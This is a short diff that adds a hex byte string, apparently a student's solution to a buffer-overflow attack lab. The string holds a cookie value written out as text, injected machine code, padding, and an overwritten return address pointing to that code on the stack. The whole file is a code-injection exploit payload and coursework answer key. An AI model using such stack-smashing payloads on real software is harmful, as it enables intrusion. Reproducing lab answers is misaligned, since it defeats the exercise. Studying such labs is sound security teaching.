@@ -1,0 +1,6 @@
+37 36 39 32 37 62 62 66  // cookie as string
+00 01 01 01 01 01 01 01
+bf 68 fd 66 55 c7 04 24 // injected code
+94 1a 40 00 c3 01 01 01
+01 01 01 01 01 01 01 01
+78 fd 66 55 00 00 00 00 // address of injected code
